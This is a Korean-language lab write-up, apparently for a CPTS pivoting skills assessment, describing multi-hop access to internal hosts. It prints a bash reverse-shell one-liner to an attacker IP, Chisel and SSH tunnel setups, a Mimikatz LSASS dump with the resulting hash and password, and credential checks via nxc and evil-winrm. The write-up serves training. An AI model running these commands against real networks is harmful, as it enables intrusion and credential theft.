---
title: "Pivoting, Tunneling, Port Forwarding - Skills Assessment"
date: 2026-08-24
layout: single
excerpt: "침투 테스트 과정에서 초기 시스템과 다음 호스트의 자격 증명을 확보했지만 공격 머신에서 내부 호스트로 직접 접근할 수 없는 상황을 가정한다. 장악한 호스트의 네트워크 인터페이스와 라우팅 정보를 분석해 Pivot 가능 여부를 판단하고, Chisel과 SSH 기반의 SOCKS 터널 및 포트 포워딩을 이용해 여러 내부 네트워크 세그먼트를 연속적으로 경유하며 최종 목표 시스템까지 접근 경로를 확장해야 한다."
author_profile: true
toc: true
toc_label: "Pivoting, Tunneling, Port Forwarding"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/cpts-network/pivoting-tunneling-port-forwarding-skills-assessment/badge.png
  teaser_home_page: true
categories: [cpts-infra]
tags: [cpts, networking, pivoting, tunneling, port-forwarding, chisel, lateral-movement]
---

# Scenario

침투 테스트 중 Web Shell 등을 통해 초기 시스템을 장악한 뒤 다음 호스트의 자격 증명까지 확보했더라도, 공격 머신에서 해당 내부 호스트로 직접 라우팅할 수 없는 상황이 발생할 수 있다.

이 경우 이미 장악한 호스트를 Pivot Host로 사용해 내부 네트워크로 트래픽을 전달하고, 직접 접근할 수 없던 시스템까지 공격 경로를 확장해야 한다.

따라서 새로운 호스트에 접근하면 네트워크 인터페이스, IP 주소, 라우팅 정보와 해당 호스트에서 접근 가능한 네트워크 범위를 우선 확인하는 것이 중요하다.

특히 하나의 호스트가 여러 네트워크 인터페이스를 가지고 있다면 Dual-Homed Host일 가능성이 있으며, 이를 통해 다른 네트워크 세그먼트로 Pivot할 수 있는지 확인할 수 있다.

## Web Enumeration

### Reverse Shell Access

우선 웹사이트에 접속해보면 브라우저에서 명령을 실행할 수 있는 Web Shell 형태의 인터페이스가 노출되어 있다:

![Pivoting, Tunneling, Port Forwarding](/assets/cpts-network/pivoting-tunneling-port-forwarding-skills-assessment/network1.png)

명령 실행이 가능한 상태이므로, 이 Web Shell을 이용해 보다 편리한 대화형 Reverse Shell을 획득할 수 있다.

먼저 로컬 Kali에서 Netcat Listener를 실행하였다:

```bash
$ nc -lvnp 9001
```

이후 Web Shell에서 다음 Reverse Shell 명령을 실행하였다:

```bash
www-data@inlanefreight.local:…/www/html# bash -c 'bash -i >& /dev/tcp/10.10.14.49/9001 0>&1'
```

그 결과 Listener로 연결이 들어오면서 `www-data` 권한의 Reverse Shell을 확보하였다:

```bash
connect to [10.10.14.49] from (UNKNOWN) [10.129.229.129] 56520

www-data@inlanefreight:/var/www/html$ 
```

## Network Discovery

### Dual-Homed Host Enumeration

`ifconfig` 를 확인한 결과 외부 접근에 사용된 인터페이스 외에 `172.16.5.15` 가 할당된 추가 인터페이스가 존재하였다. 

다음 Pivot 대상을 찾기 위해 우선 `172.16.5.0/24` 범위를 확인하였다:

```bash
www-data@inlanefreight:/var/www/html$ ifconfig 

ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.229.129  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::a0de:adff:fec8:7840  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::a0de:adff:fec8:7840  prefixlen 64  scopeid 0x0<global>
        ether a2:de:ad:c8:78:40  txqueuelen 1000  (Ethernet)
        RX packets 888  bytes 73863 (73.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 220  bytes 21531 (21.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.15  netmask 255.255.0.0  broadcast 172.16.255.255
        inet6 fe80::a0de:adff:fe30:ce9c  prefixlen 64  scopeid 0x20<link>
        ether a2:de:ad:30:ce:9c  txqueuelen 1000  (Ethernet)
        RX packets 285  bytes 18362 (18.3 KB)
        RX errors 0  dropped 12  overruns 0  frame 0
        TX packets 17  bytes 1386 (1.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

이처럼 WEB 서버가 두 개의 네트워크 인터페이스를 가진 Dual-Homed Host임을 확인했으므로, 추가 인터페이스를 통해 도달 가능한 호스트를 확인하였다:

```bash
www-data@inlanefreight:/var/www/html$ for i in {1..254}; do ping -c 1 -W 1 172.16.5.$i >/dev/null 2>&1 && echo "[+] 172.16.5.$i is up"; done

[+] 172.16.5.15 is up
[+] 172.16.5.35 is up
```

스캔한 `172.16.5.0/24` 범위에서는 현재 호스트인 `172.16.5.15` 와 추가 호스트 `172.16.5.35` 가 ICMP에 응답하였다.

### Credential Discovery

추가 열거 과정에서 `/home/webadmin` 경로의 `for-admin-eyes-only` 파일을 발견했으며, 내부에는 다음 Pivot Host에 접근할 수 있는 자격 증명이 기록되어 있었다:

```text
# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of : 
Plain Human work!
```

이를 통해 `mlefay / Plain Human work!` 자격 증명을 확보하였다.

## First Pivot - Reverse SOCKS with Chisel

### Creating the First SOCKS Tunnel

Kali에서 직접 접근할 수 없는 `172.16.5.35` 로 이동하기 위해 WEB 서버를 경유하는 Reverse SOCKS Tunnel을 구성하였다.

먼저 Kali에서 Chisel Server를 Reverse Mode로 실행하였다:

```bash
$ ./chisel server --reverse -p 8001
```

이후 장악한 WEB 서버에서 Chisel Client를 실행하고 `R:socks` 를 지정하였다:

```bash
www-data@inlanefreight:/tmp$ ./chisel client 10.10.14.49:8001 R:socks

2026/08/24 10:03:42 client: Connecting to ws://10.10.14.49:8001
2026/08/24 10:03:44 client: Connected (Latency 195.570256ms)
```

이 구성으로 Kali 측 Chisel Server에 SOCKS Proxy가 생성되고, ProxyChains를 통해 WEB 서버에서 접근 가능한 내부 네트워크로 트래픽을 전달할 수 있게 되었다.

### Accessing PIVOT-SRV01

이후 ProxyChains를 통해 `172.16.5.35` 의 SSH 서비스에 확보한 자격 증명을 검증한 결과 정상적으로 Shell Access가 가능함을 확인하였다:

```bash
$ proxychains -q nxc ssh 172.16.5.35 -u mlefay -p 'Plain Human work!' 

SSH         172.16.5.35     22     172.16.5.35      [*] SSH-2.0-OpenSSH_for_Windows_8.9
SSH         172.16.5.35     22     172.16.5.35      [+] mlefay:Plain Human work! (Pwn3d!) Windows - Shell access!
```

SSH로 접속한 결과 대상은 Windows 기반의 `PIVOT-SRV01` 이었으며 정상적으로 세션을 확보하였다:

```powershell
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

mlefay@PIVOT-SRV01 C:\Users\mlefay> 
```

`whoami /priv` 를 확인한 결과 `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, `SeImpersonatePrivilege` 등 강력한 로컬 권한이 활성화되어 있었다:

```powershell
mlefay@PIVOT-SRV01 C:\Users\mlefay>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== =======
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

### Discovering the Next Network

`ipconfig /all` 을 확인하면 `PIVOT-SRV01` 에는 `172.16.5.35` 외에도 `172.16.6.35` 가 할당된 추가 인터페이스가 존재한다. 

두 인터페이스 모두 `/16` 으로 표시되므로 네트워크 계산상 주소 범위는 겹치지만, 이 환경에서는 `172.16.6.x` 대역의 추가 호스트로 통신할 수 있는 다음 Pivot 지점으로 활용할 수 있다:

```powershell
mlefay@PIVOT-SRV01 C:\Users\mlefay>ipconfig /all

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : A2-DE-AD-23-0B-C2
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::45e0:ecc7:d829:af7b%4(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.5.35(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 172.16.5.1
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-32-37-08-F3-A2-DE-AD-23-0B-C2
   DNS Servers . . . . . . . . . . . : 172.16.10.5
                                       127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet1 2:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : A2-DE-AD-77-C9-D0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::c8fb:f9fd:4e03:b497%5(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.6.35(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . :
   DHCPv6 IAID . . . . . . . . . . . : 184569942
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-32-37-08-F3-A2-DE-AD-23-0B-C2
   DNS Servers . . . . . . . . . . . : 172.16.10.5
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

따라서 `172.16.6.0/24` 범위에 ICMP Ping Sweep을 수행한 결과 `172.16.6.25`, `172.16.6.35`, `172.16.6.45` 가 응답하였다. 

이 중 `172.16.6.35` 는 현재 `PIVOT-SRV01` 자신의 주소이므로 다음 대상으로는 `.25` 와 `.45` 를 확인하였다:

```powershell
mlefay@PIVOT-SRV01 C:\Users\mlefay>for /L %i in (1,1,254) do @ping -n 1 -w 200 172.16.6.%i | find "TTL="

Reply from 172.16.6.25: bytes=32 time=2ms TTL=128 
Reply from 172.16.6.35: bytes=32 time<1ms TTL=128 
Reply from 172.16.6.45: bytes=32 time=9ms TTL=64 
```

### Credential Extraction on PIVOT-SRV01

`SeDebugPrivilege` 가 활성화되어 있으므로, 해당 권한으로 LSASS의 인증 자료에 접근할 수 있는지 확인하기 위해 Mimikatz를 전송하였다.

먼저 Kali에서 기존 SOCKS Tunnel을 경유해 SCP로 `mimikatz.exe` 를 전송하였다:

```bash
$ proxychains -q scp -O ./mimikatz.exe mlefay@172.16.5.35:./

** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
mlefay@172.16.5.35's password: 
mimikatz.exe                                                                                                                          100% 1324KB 937.1KB/s   00:01
```

이후 Mimikatz를 실행한 결과 `vfrank`의 NTLM Hash와, Kerberos Credential 영역에 남아 있던 평문 비밀번호까지 확인할 수 있었다:

```powershell
mlefay@PIVOT-SRV01 C:\Users\mlefay>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

Authentication Id : 0 ; 164371 (00000000:00028213)
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 8/24/2026 8:16:38 AM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103 
        msv :
         [00000003] Primary
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
        tspkg :  
        wdigest :
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : vfrank
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Imply wet Unmasked!
        ssp :
        credman :
```

출력에서 Domain이 `INLANEFREIGHT` 및 `INLANEFREIGHT.LOCAL` 로 표시되므로 `vfrank` 는 도메인 계정임을 확인할 수 있다.

이제 `172.16.6.25`, `172.16.6.45` 의 내부 호스트와 `vfrank` 자격 증명을 확보했으므로, `PIVOT-SRV01` 을 두 번째 Pivot 지점으로 사용해 다음 구간으로 접근할 수 있다.

## Second Pivot - SSH Dynamic Port Forwarding

### Creating a Second SOCKS Proxy

Kali에서 기존 첫 번째 SOCKS Proxy를 경유해 `PIVOT-SRV01` 로 SSH 연결을 생성하고, 로컬 `127.0.0.1:1081` 에 Dynamic SOCKS Proxy를 열었다:

```bash
$ proxychains -q ssh -N -D 127.0.0.1:1081 mlefay@172.16.5.35
```

기존 첫 번째 Pivot에서 `1080` 포트를 사용하고 있었으므로, 두 번째 SOCKS Proxy는 충돌을 피하기 위해 `1081` 을 사용하였다.

두 번째 Proxy 경로를 분리해서 사용하기 위해 기존 ProxyChains 설정 파일을 복사하여 별도의 설정 파일을 만들었다.

설정 파일을 다음과 같이 복사하였다:

```bash
$ cp /etc/proxychains4.conf /tmp/proxychains6.conf
```

복사한 설정 파일의 `[ProxyList]` 에서 SOCKS5 포트를 `1081` 로 지정하였다:

```text
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4        127.0.0.1 9050
socks5  127.0.0.1 1081 ←
```

이후 `-f` 옵션으로 두 번째 ProxyChains 설정을 지정하여 `172.16.6.25` 의 RDP 인증을 확인한 결과 `vfrank` 자격 증명이 유효함을 확인하였다:

```bash
$ proxychains -q -f /tmp/proxychains6.conf nxc rdp 172.16.6.25 -u vfrank -p 'Imply wet Unmasked!'

RDP         172.16.6.25     3389   PIVOTWIN10       [*] Windows 10 or Windows Server 2016 Build 18362 (name:PIVOTWIN10) (domain:INLANEFREIGHT.LOCAL) (nla:False)
RDP         172.16.6.25     3389   PIVOTWIN10       [+] INLANEFREIGHT.LOCAL\vfrank:Imply wet Unmasked! (Pwn3d!)
```

이후 RDP로 접속하여 `PIVOTWIN10` 에 정상적으로 접근하였다:

![Pivoting, Tunneling, Port Forwarding](/assets/cpts-network/pivoting-tunneling-port-forwarding-skills-assessment/network2.png)

### Discovering the Third Network

PIVOTWIN10에서 `ipconfig` 를 확인한 결과 기존 `172.16.6.25` 인터페이스 외에 `172.16.10.25` 가 할당된 추가 인터페이스가 존재하였다:

![Pivoting, Tunneling, Port Forwarding](/assets/cpts-network/pivoting-tunneling-port-forwarding-skills-assessment/network3.png)

따라서 `172.16.10.0/24` 범위에서 응답하는 호스트를 확인하였다:

```powershell
C:\Users\vfrank> for /L %i in (1,1,254) do @ping -n 1 -w 200 172.16.10.%i | find "TTL="

Reply from 172.16.10.5: bytes=32 time<1ms TTL=128
Reply from 172.16.10.25: bytes=32 time<1ms TTL=128
```

`172.16.10.25` 는 현재 `PIVOTWIN10` 자신의 주소이므로 제외하면, 추가 목표로 `172.16.10.5` 가 확인된다.

Kali에서 `172.16.10.5` 로 직접 접근할 수 없으므로 `PIVOTWIN10 → PIVOT-SRV01 → Kali` 경로를 연결하는 세 번째 Multi-Hop Tunnel을 구성하였다.

## Third Pivot - Multi-Hop Tunneling

### Building the Chained Chisel Tunnel

먼저 두 번째 Pivot 경로를 통해 `PIVOTWIN10` 에 WinRM으로 접속하고 `chisel.exe` 를 업로드하였다:

```bash
$ proxychains -q -f /tmp/proxychains6.conf evil-winrm -i 172.16.6.25 -u vfrank -p 'Imply wet Unmasked!'

*Evil-WinRM* PS C:\Users\vfrank> upload chisel.exe

Data: 14575616 bytes of 14575616 bytes copied
                                        
Info: Upload successful!
```

같은 방식으로 `PIVOT-SRV01` 에도 `chisel.exe` 를 전송하였다:

```bash
$ proxychains -q scp -O ./chisel.exe mlefay@172.16.5.35:./
```

`PIVOT-SRV01` 에서 Reverse Connection을 받을 Chisel Server를 `9001` 포트로 실행하였다:

```powershell
mlefay@PIVOT-SRV01 C:\Users\mlefay>chisel.exe server --reverse --port 9001
```

이후 `PIVOTWIN10` 에서 `PIVOT-SRV01:9001` 로 Chisel Client를 연결하고 `R:1082:socks` 를 지정하였다. 

이 설정은 `PIVOT-SRV01` 의 `127.0.0.1:108` 2에 Reverse SOCKS Listener를 만들고, 해당 SOCKS 트래픽을 `PIVOTWIN10` 을 통해 전달한다:

```powershell
*Evil-WinRM* PS C:\Users\vfrank> ./chisel.exe client 172.16.6.35:9001 R:1082:socks

chisel.exe : 2026/08/24 07:57:46 client: Connecting to ws://172.16.6.35:9001
    + CategoryInfo          : NotSpecified: (2026/09/12 07:5...72.16.6.35:9001:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2026/08/24 07:57:46 client: Connected (Latency 1.6825ms)
```

이제 `PIVOT-SRV01:1082` 에 연결하면 실제 트래픽은 `PIVOTWIN10` 을 통해 `172.16.10.x` 네트워크로 전달되는 구조가 완성되었다.

### Exposing the Nested SOCKS Proxy to Kali

다만 Kali에서는 `PIVOT-SRV01` 의 Loopback `1082` 에 직접 접근할 수 없으므로, SSH Local Port Forwarding을 이용해 Kali의 `127.0.0.1:1082` 를 PIVOT-SRV01의 `127.0.0.1:1082` 와 연결하였다:

```bash
$ proxychains -q ssh -N -L 127.0.0.1:1082:127.0.0.1:1082 mlefay@172.16.5.35
```

결과적으로 Kali의 `127.0.0.1:1082` → SSH Tunnel → `PIVOT-SRV01:1082` → Chisel Reverse SOCKS → `PIVOTWIN10` → `172.16.10.0/24` 순서로 트래픽이 전달된다.

세 번째 Pivot 경로도 별도로 관리하기 위해 ProxyChains 설정 파일을 다시 복사하였다:

```bash
$ cp /tmp/proxychains6.conf /tmp/proxychains10.conf
```

새 설정 파일의 SOCKS5 포트를 Kali에 노출한 `1082` 로 변경하였다:

```text
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4        127.0.0.1 9050
socks5  127.0.0.1 1082 ←
```

### Reaching the Final Internal Host

이 설정 파일을 지정하면 Kali에서 Multi-Hop Tunnel을 통해 `172.16.10.0/24` 에 접근할 수 있다.

`172.16.10.5` 의 SMB에 `vfrank` 자격 증명을 검증한 결과 관리자 수준의 접근이 확인되었다:

```bash
$ proxychains -q -f /tmp/proxychains10.conf nxc smb 172.16.10.5 -u vfrank -p 'Imply wet Unmasked!'

SMB         172.16.10.5     445    ACADEMY-PIVOT-D  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ACADEMY-PIVOT-D) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                     
SMB         172.16.10.5     445    ACADEMY-PIVOT-D  [+] INLANEFREIGHT.LOCAL\vfrank:Imply wet Unmasked! (Pwn3d!)
```

NXC의 SMB 결과에서 `Pwn3d!` 가 표시되었으므로, 해당 호스트의 SMB 관점에서 vfrank가 로컬 관리자 수준의 권한을 가진 것으로 판단할 수 있다.

WinRM도 허용되어 있어 동일한 자격 증명으로 `ACADEMY-PIVOT-D` 에 원격 세션을 생성하였다:

```bash
$ proxychains -q -f /tmp/proxychains10.conf evil-winrm -i 172.16.10.5 -u vfrank -p 'Imply wet Unmasked!'

*Evil-WinRM* PS C:\Users\vfrank\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                           Type             SID                                          Attributes
==================================================== ================ ============================================ ===============================================================
Everyone                                             Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                              Alias            S-1-5-32-550                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                        Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access           Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                               Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
NT AUTHORITY\NETWORK                                 Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                     Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                       Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
INLANEFREIGHT\Domain Admins                          Group            S-1-5-21-3858284412-1730064152-742000644-512 Mandatory group, Enabled by default, Enabled group
INLANEFREIGHT\Denied RODC Password Replication Group Alias            S-1-5-21-3858284412-1730064152-742000644-572 Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication                     Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level                 Label            S-1-16-12288
```

`whoami /groups` 결과에서 `INLANEFREIGHT\Domain Admins` 와 `BUILTIN\Administrators` 가 활성화된 그룹으로 확인된다. 

따라서 `vfrank` 는 도메인 관리자 권한을 가진 계정이며, Multi-Hop Pivoting을 통해 최종적으로 고권한 내부 시스템까지 접근하는 데 성공하였다.